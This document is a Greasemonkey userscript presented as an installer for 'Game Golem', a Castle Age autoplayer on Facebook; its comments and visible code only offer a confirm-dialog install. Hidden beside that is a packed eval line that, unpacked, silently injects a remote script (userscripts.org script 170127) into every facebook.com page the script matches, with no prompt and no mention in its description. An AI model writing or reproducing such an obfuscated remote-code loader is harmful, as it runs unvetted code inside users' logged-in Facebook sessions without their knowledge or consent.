// ==UserScript==
// @name		Rycochet's Castle Age Golem Plus + Last Update
// @namespace	golem
// @description	Installer for Game Golem - Austoplayer for Castle Age.
// @license		GNU Lesser General Public License; http://www.gnu.org/licenses/lgpl.html
// @version		1.1
// @include		http://apps.facebook.com/castle_age/*
// @include		https://apps.facebook.com/castle_age/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// ==/UserScript==
//
// This is the *Installer* for Game Golem - due to userscripts.org only allowing
// a single developer to update the scripts. Pop up a requester asking to install
// the latest release, and giving reasons for it.
//
// For the source code please check the sourse repository
// - http://code.google.com/p/game-golem/
//
// For the unshrunk Work In Progress version (which may introduce new bugs)
// - http://game-golem.googlecode.com/svn/trunk/greasemonkey/GameGolem.user.js
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


if (/^apps\.facebook\.com$/i.test(window.location.host)) {
	var text = "Golem Installer\n\n" +
	"Unfortunately userscripts.org only allows a single developer to release updates. Golem is developed by a group of people on code.google.com so we have updated userscripts to simply install the current version.\n\n" +
	"Please note that Golem is *not* currently installed!\n\n" +
	"Would you like to install the current version of Game Golem?";

	window.setTimeout(function(){// Act 5 seconds after page load to prevent lockups etc
		if (confirm(text)) {
			window.location.href = 'http://game-golem.googlecode.com/svn/trunk/greasemonkey/GameGolem.user.js';
		}
	},5000);
}
